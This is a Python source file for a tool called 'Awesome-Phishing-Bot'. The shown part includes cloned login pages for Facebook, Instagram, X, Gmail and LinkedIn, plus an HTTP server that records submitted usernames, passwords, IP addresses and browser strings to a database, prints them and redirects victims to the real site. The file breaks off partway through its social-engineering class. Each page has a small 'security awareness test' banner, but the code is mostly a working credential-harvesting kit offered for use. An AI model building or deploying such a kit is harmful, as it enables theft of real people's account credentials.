#!/usr/bin/env python3
"""
🌿 AWESOME-PHISHING-BOT v9.5.1
Author: Ian Carter Kulani
Description: Ultimate Phishing & Remote Access Bot 
Features:
    - 🎣 Advanced Phishing Framework (Facebook, Instagram, Twitter, Gmail, LinkedIn, Custom)
    - 🤖 Multi-Platform Bot Support (Telegram, Discord, WhatsApp, Slack, iMessage, Google Chat)
    - 🔐 SSH Remote Access via Chat Platforms
    - 🚀 Traffic Generation & Analysis
    - 📊 Graphical Reports & Statistics
    - 🔍 Shodan & Hunter.io Integration
    - 🕷️ Nikto Web Vulnerability Scanner
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io

# Data visualization imports
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np

from http.server import BaseHTTPRequestHandler, HTTPServer
import socketserver

# PDF generation
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER, TA_LEFT

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    from google.oauth2.credentials import Credentials
    from googleapiclient.discovery import build
    from google.auth.transport.requests import Request
    GOOGLE_CHAT_AVAILABLE = False  # Requires webhook setup
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# =====================
# GREEN THEME (Forest/Matrix Style)
# =====================
class GreenTheme:
    """Green color theme for Awesome-Phishing-Bot"""
    
    # Green shades
    GREEN1 = '\033[92m'      # Bright Green
    GREEN2 = '\033[32m'      # Green
    GREEN3 = '\033[38;5;34m' # Forest Green
    GREEN4 = '\033[38;5;40m' # Lime Green
    DARK_GREEN = '\033[38;5;22m'
    LIME = '\033[38;5;154m'
    
    # Other colors
    WHITE = '\033[97m'
    BLACK = '\033[30m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    
    # Theme colors
    PRIMARY = GREEN1
    SECONDARY = GREEN2
    ACCENT = GREEN3
    HIGHLIGHT = GREEN4
    SUCCESS = GREEN1
    ERROR = RED
    WARNING = YELLOW
    INFO = CYAN

Colors = GreenTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".awesome_bot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "awesome_bot.db")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
REPORT_DIR = "awesome_reports"
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
LOG_FILE = os.path.join(CONFIG_DIR, "awesome_bot.log")

# Create directories
directories = [
    CONFIG_DIR, PHISHING_DIR, PHISHING_TEMPLATES_DIR, PHISHING_LOGS_DIR,
    CAPTURED_CREDENTIALS_DIR, REPORT_DIR, GRAPHICS_DIR, SSH_KEYS_DIR,
    WHATSAPP_SESSION_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - AWESOME-BOT - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("AwesomeBot")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id TEXT PRIMARY KEY,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(platform, user_id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {
                "platform": "facebook",
                "html": self._get_facebook_template()
            },
            "instagram_default": {
                "platform": "instagram",
                "html": self._get_instagram_template()
            },
            "twitter_default": {
                "platform": "twitter",
                "html": self._get_twitter_template()
            },
            "gmail_default": {
                "platform": "gmail",
                "html": self._get_gmail_template()
            },
            "linkedin_default": {
                "platform": "linkedin",
                "html": self._get_linkedin_template()
            }
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a5f3a 0%, #0d3b22 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 40px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #d4edda;
            border: 1px solid #28a745;
            border-radius: 4px;
            color: #155724;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            <div class="warning">
                🌿 This is a security awareness test. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1a5f3a 0%, #0d3b22 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-family: 'Billabong', cursive;
            font-size: 50px;
            margin: 0;
            color: #262626;
        }
        .form-group {
            margin-bottom: 10px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 9px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #d4edda;
            border: 1px solid #28a745;
            border-radius: 4px;
            color: #155724;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            <div class="warning">
                🌿 This is a security awareness test. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1a5f3a 0%, #0d3b22 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 16px;
            padding: 48px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 40px;
            margin: 0;
            color: #e7e9ea;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 4px;
            color: #e7e9ea;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1d9bf0;
            color: white;
            border: none;
            border-radius: 9999px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .warning {
            margin-top: 20px;
            padding: 12px;
            background-color: #1a3a2a;
            border: 1px solid #28a745;
            border-radius: 8px;
            color: #28a745;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>𝕏</h1>
                <h2>Sign in to X</h2>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone, email, or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Next</button>
            </form>
            <div class="warning">
                🌿 This is a security awareness test. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #1a5f3a 0%, #0d3b22 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 28px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #1a73e8;
            font-size: 24px;
            margin: 10px 0 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 13px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }
        .warning {
            margin-top: 30px;
            padding: 12px;
            background-color: #d4edda;
            border: 1px solid #28a745;
            border-radius: 8px;
            color: #155724;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Gmail</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Next</button>
            </form>
            <div class="warning">
                🌿 This is a security awareness test. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a5f3a 0%, #0d3b22 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            padding: 40px 32px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            color: #0a66c2;
            font-size: 32px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 1px solid #666666;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #0a66c2;
            color: white;
            border: none;
            border-radius: 28px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 8px;
        }
        .warning {
            margin-top: 24px;
            padding: 12px;
            background-color: #d4edda;
            border: 1px solid #28a745;
            border-radius: 4px;
            color: #155724;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>LinkedIn</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign in</button>
            </form>
            <div class="warning">
                🌿 This is a security awareness test. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    # Database operations
    def save_phishing_link(self, link: Dict) -> bool:
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link['id'], link['platform'], link.get('original_url', ''), 
                  link['phishing_url'], link['template'], link.get('qr_code_path')))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC')
            else:
                self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_clicks(self, link_id: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_credential(self, link_id: str, username: str, password: str, ip: str, user_agent: str):
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip, user_agent))
            self.conn.commit()
            logger.info(f"Credentials captured for {link_id} from {ip}")
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
    
    def get_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        try:
            if link_id:
                self.cursor.execute('SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name', (platform,))
            else:
                self.cursor.execute('SELECT * FROM phishing_templates ORDER BY platform, name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get templates: {e}")
            return []
    
    def log_command(self, command: str, source: str = "local", success: bool = True, output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM command_history ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def authorize_user(self, platform: str, user_id: str, username: str = None) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO authorized_users (platform, user_id, username, authorized)
                VALUES (?, ?, ?, 1)
            ''', (platform, user_id, username))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to authorize user: {e}")
            return False
    
    def is_authorized(self, platform: str, user_id: str) -> bool:
        try:
            self.cursor.execute('''
                SELECT authorized FROM authorized_users 
                WHERE platform = ? AND user_id = ? AND authorized = 1
            ''', (platform, user_id))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check authorization: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['total_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            return stats
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
            return {}
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# PHISHING REQUEST HANDLER
# =====================
class PhishingHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            if self.path == '/':
                self.send_phishing_page()
            elif self.path == '/favicon.ico':
                self.send_response(404)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"GET error: {e}")
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent
                )
                
                print(f"\n{Colors.GREEN1}🎣 PHISHING ATTACK DETECTED!{Colors.RESET}")
                print(f"{Colors.GREEN2}📧 Credentials captured:{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
            
            # Redirect to real site
            self.send_response(302)
            if 'facebook' in self.server_instance.platform:
                self.send_header('Location', 'https://www.facebook.com')
            elif 'instagram' in self.server_instance.platform:
                self.send_header('Location', 'https://www.instagram.com')
            elif 'twitter' in self.server_instance.platform:
                self.send_header('Location', 'https://twitter.com')
            elif 'gmail' in self.server_instance.platform:
                self.send_header('Location', 'https://mail.google.com')
            elif 'linkedin' in self.server_instance.platform:
                self.send_header('Location', 'https://www.linkedin.com')
            else:
                self.send_header('Location', 'https://www.google.com')
            self.end_headers()
            
        except Exception as e:
            logger.error(f"POST error: {e}")
    
    def send_phishing_page(self):
        try:
            if self.server_instance and self.server_instance.html_content:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(self.server_instance.html_content.encode('utf-8'))
                if self.server_instance.db and self.server_instance.link_id:
                    self.server_instance.db.update_phishing_clicks(self.server_instance.link_id)
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Send page error: {e}")

# =====================
# PHISHING SERVER
# =====================
class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = 8080
        self.link_id = None
        self.platform = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            
            handler = PhishingHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            logger.info(f"Phishing server started on port {port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
    
    def get_url(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return f"http://{local_ip}:{self.port}"
        except:
            return f"http://localhost:{self.port}"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None, custom_template: str = None) -> Dict:
        try:
            link_id = str(uuid.uuid4())[:8]
            
            # Get template
            if custom_template:
                html_content = custom_template
            else:
                templates = self.db.get_phishing_templates(platform)
                if templates:
                    html_content = templates[0].get('html_content', '')
                else:
                    if platform == "facebook":
                        html_content = self.db._get_facebook_template()
                    elif platform == "instagram":
                        html_content = self.db._get_instagram_template()
                    elif platform == "twitter":
                        html_content = self.db._get_twitter_template()
                    elif platform == "gmail":
                        html_content = self.db._get_gmail_template()
                    elif platform == "linkedin":
                        html_content = self.db._get_linkedin_template()
                    else:
                        html_content = self._get_custom_template()
            
            phishing_url = f"http://localhost:8080/{link_id}"
            
            link_data = {
                'id': link_id,
                'platform': platform,
                'original_url': custom_url or f"https://www.{platform}.com",
                'phishing_url': phishing_url,
                'template': platform,
                'created_at': datetime.datetime.now().isoformat()
            }
            
            self.db.save_phishing_link(link_data)
            
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_url,
                'created_at': link_data['created_at']
            }
            
        except Exception as e:
            logger.error(f"Failed to generate phishing link: {e}")
            return {'success': False, 'error': str(e)}
    
    def _get_custom_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a5f3a 0%, #0d3b22 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #28a745;
            font-size: 28px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #28a745 0%, #1a5f3a 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #d4edda;
            border: 1px solid #28a745;
            border-radius: 5px;
            color: #155724;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Secure Login</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="warning">
                🌿 This is a security awareness test. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
